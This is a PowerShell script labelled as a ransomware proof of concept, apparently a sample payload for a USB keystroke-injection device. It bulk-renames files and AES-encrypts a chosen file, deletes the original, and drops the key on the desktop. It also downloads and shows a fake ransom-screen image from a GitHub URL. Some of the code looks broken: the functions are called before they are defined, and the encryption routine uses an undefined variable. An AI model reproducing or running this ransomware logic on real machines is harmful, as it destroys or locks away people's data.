# BTBit Powershell Ransomware PoC 
#
# set this parameters as variables before running the payload script
#
# $type = operation type single_enc, single_ren, multi_ren
# $file = name of the file or filter for multi_ren. ex: test.txt or .db
# if variable is not set the process will not be executed
#
# $file_drive = drive where the script will run. Ex: d
# $file_path = path where the file(s) is located. Ex: \ or \data
# if variable is not set then current drive and current path will be used
# 
# display fake encryption screen
# $show_screen = "yes" or "true" will show. any other value will NOT show  
#
get-variable | out-string
sleep 20
$xxx = -join("file_drive:", $file_drive, "!")
echo $xxx
if (-not($file_drive -eq "")) { 
  $file_drive_long = $file_drive+":" 
  Set-Location $file_drive_long
}
if (-not($file_path -eq "")) { Set-Location "$file_path" }

if ($type -eq "single_enc") { Do_Single_File_ENC }
if ($type -eq "multi_ren") { Do_Multiple_Files_REN }
if ($type -eq "single_ren") { Do_Single_File_REN }
if ($show_screen.ToUpper() -eq "YES" -Or $show_screen.ToUpper() -eq "TRUE") { Do_Show_Screen }


function Do_Single_File_REN {
  if ($file -eq "") { return }    
  $curdir = get-location;  
  $file_full_path = -join($curdir, $file)
  if (-not(Test-Path -Path $file_full_path -PathType Leaf)) { return }
  mv "$file" "$file.ren"
}


function Do_Multiple_Files_REN {
  if ($file -eq "") { return }    
  $file_count = (gci -Path . -File | where fullname -like "*$file").Count
  if ($file_count -eq "0") { exit }
  get-childitem -path $path -filter "*$file" | rename-item -newname {$_.name -replace "$file","$file.enc"}
}


function Do_Single_File_ENC {
  if ($file -eq "") { return }    
  if ($file_drive -eq "") { $file_drive = (get-location).Drive.Name }
  $file_exist = "$file_drive" + ":\" + "$file_enc"
  if (-not(Test-Path -Path $file_exist -PathType Leaf)) { return }
  #
  # Prepare encryption key and IV
  $RNGCrypto = New-Object System.Security.Cryptography.RNGCryptoServiceProvider 
  $key = New-Object Byte[] 32
  $RNGCrypto.GetBytes($key)
  $iv = New-Object Byte[] 16
  $RNGCrypto.GetBytes($iv)
  #
  # create ps AES objects
  # sources
  # http://indogeeks.com/how-to-use-aes-encryption-in-powershell/
  # https://gist.github.com/ctigeek/2a56648b923d198a6e60
  $AES = New-Object System.Security.Cryptography.AesManaged
  $AES.Key = $key
  $AES.iv = $iv
  echo "AES key: $key"
  echo "IV: $iv"
  $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
  $Encryptor = $AES.CreateEncryptor()
  $bytes = gc $file_enc -Encoding byte
  # remove the clear file from the disk
  rm "$file_enc"
  #
  $encryptedData = $Encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
  [byte[]] $fullData = $AES.IV + $encryptedData
  # save IV and the encrypted in file.enc
  sc -Value $fullData -LiteralPath "$file_enc.enc" -Encoding byte
  # cleare original file from memory 
  $bytes = $Null
  #
  # write encryption key on user's desktop
  $userDesk = [Environment]::GetFolderPath("Desktop")
  sc -Value $key -LiteralPath "$userDesk/BTBit.key" -Encoding byte
}


function Do_Show_Screen {  
  $screen = $ENV:LOCALAPPDATA + "\screen_enc.jpg"  
  (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/screen_enc.jpg", $screen)
  sleep 10
  [void][reflection.assembly]::LoadWithPartialName("System.Windows.Forms")
  Add-Type -AssemblyName 'System.Windows.Forms'
  $img = [System.Drawing.Image]::Fromfile((get-item $screen))

  [System.Windows.Forms.Application]::EnableVisualStyles()
  $form = new-object Windows.Forms.Form
  $form.Text = "Image Viewer"
  $form.Width = $img.Size.Width;
  $form.Height =  $img.Size.Height;
  $pictureBox = new-object Windows.Forms.PictureBox
  $pictureBox.Width =  $img.Size.Width;
  $pictureBox.Height =  $img.Size.Height;

  $pictureBox.Image = $img;
  $form.controls.add($pictureBox)
  $form.Add_Shown( { $form.Activate() } )
  $form.ShowDialog()
}
